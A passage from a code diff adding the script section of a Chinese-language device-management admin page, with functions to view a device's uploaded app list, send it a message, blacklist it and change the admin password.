+                el.innerHTML = '<div class="empty-data">加载失败: ' + escapeHtml(e.message) + '<br><small style="color:#999;">请检查设备是否已上传数据</small></div>';
+            }
+        }
+        
+        async function viewApps(id) {
+            const el = document.getElementById('modal-data-body');
+            const title = document.getElementById('modal-data-title');
+            title.textContent = 'APP 列表';
+            el.innerHTML = '加载中...';
+            document.getElementById('modal-data').classList.add('show');
+            try {
+                const res = await apiRequest(API_BASE + '/devices/' + id + '/apps', { method: 'GET' });
+                if (!res.ok) {
+                    let errorMsg = '获取 APP 列表失败';
+                    try {
+                        const errorData = await res.json();
+                        errorMsg = errorData.detail || errorData.message || errorMsg;
+                    } catch (parseError) {
+                        errorMsg = `HTTP ${res.status}: ${res.statusText}`;
+                    }
+                    throw new Error(errorMsg);
+                }
+                const list = (await res.json()).app_list || [];
+                if (!list.length) {
+                    el.innerHTML = '<div class="empty-data">暂无 APP 数据<br><small style="color:#999;">该设备尚未上传APP列表数据</small></div>';
+                    return;
+                }
+                const rows = list.map(a => {
+                    const name = escapeHtml((a.app_name || a.name || a.packageName || '').toString());
+                    const pkg = escapeHtml((a.package_name || a.packageName || a.package || '').toString());
+                    const ver = escapeHtml((a.version || a.versionName || '').toString());
+                    return '<tr><td>' + name + '</td><td>' + pkg + '</td><td>' + ver + '</td></tr>';
+                }).join('');
+                el.innerHTML = '<table><thead><tr><th>應用名</th><th>包名</th><th>版本</th></tr></thead><tbody>' + rows + '</tbody></table>';
+            } catch (e) {
+                console.error('加载APP列表失败:', e);
+                el.innerHTML = '<div class="empty-data">加载失败: ' + escapeHtml(e.message) + '<br><small style="color:#999;">请检查设备是否已上传数据</small></div>';
+            }
+        }
+        
+        async function sendMsg(id) {
+            const input = document.getElementById('msg-' + id);
+            const txt = input && input.value ? input.value.trim() : '';
+            if (!txt) { showMessage('请先填写内容', 'error'); return; }
+            try {
+                const res = await apiRequest(API_BASE + '/devices/' + id + '/send-message', {
+                    method: 'POST',
+                    body: JSON.stringify({ message: txt })
+                });
+                if (!res.ok) throw new Error((await res.json().catch(() => ({}))).detail || '发送失败');
+                showMessage('已发送', 'success');
+                if (input) input.value = '';
+            } catch (e) { showMessage('发送失败: ' + e.message, 'error'); }
+        }
+        
+        async function toggleBlacklist(deviceId, isBlacklist) {
+            try {
+                const res = await apiRequest(API_BASE + '/devices/' + deviceId + '/blacklist', {
+                    method: 'PUT',
+                    body: JSON.stringify({ is_blacklisted: isBlacklist })
+                });
+                if (!res.ok) throw new Error('操作失败');
+                const updated = await res.json();
+                const d = getDeviceById(deviceId);
+                if (d) d.is_blacklisted = updated.is_blacklisted;
+                applySearch();
+                showMessage(isBlacklist ? '已拉黑' : '已解封', 'success');
+            } catch (e) { showMessage('操作失败: ' + e.message, 'error'); }
+        }
+        
+        document.getElementById('menu-change-pwd').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('modal-change-pwd').classList.add('show');
+            document.getElementById('pwd-old').value = '';
+            document.getElementById('pwd-new').value = '';
+        });
+        
+        function closeChangePwdModal() {
+            document.getElementById('modal-change-pwd').classList.remove('show');
+        }
+        
+        async function submitChangePwd() {
+            const oldP = document.getElementById('pwd-old').value;
+            const newP = document.getElementById('pwd-new').value;
+            if (!oldP || !newP) { showMessage('请填写旧密码和新密码', 'error'); return; }
+            if (newP.length < 6) { showMessage('新密码至少6位', 'error'); return; }
+            try {
+                const res = await apiRequest(API_BASE + '/users/me/change-password', {
+                    method: 'POST',
+                    body: JSON.stringify({ old_password: oldP, new_password: newP })
+                });
+                if (!res.ok) {
+                    const err = await res.json().catch(() => ({}));
+                    throw new Error(err.detail || '修改失败');
+                }
+                showMessage('密码已修改', 'success');
+                closeChangePwdModal();
+            } catch (e) {
+                showMessage('修改密码失败: ' + (e.message || e), 'error');
+            }
+        }
+        
+        window.addEventListener('DOMContentLoaded', async () => {
+            if (!getToken()) {
+                showMessage('未登录，正在跳转...', 'info');
+                setTimeout(() => { window.location.href = '/login'; }, 1500);
+                return;
+            }
+            await loadUserInfo();
+            await loadDevices();
+        });
+    </script>
+</body>
+</html>
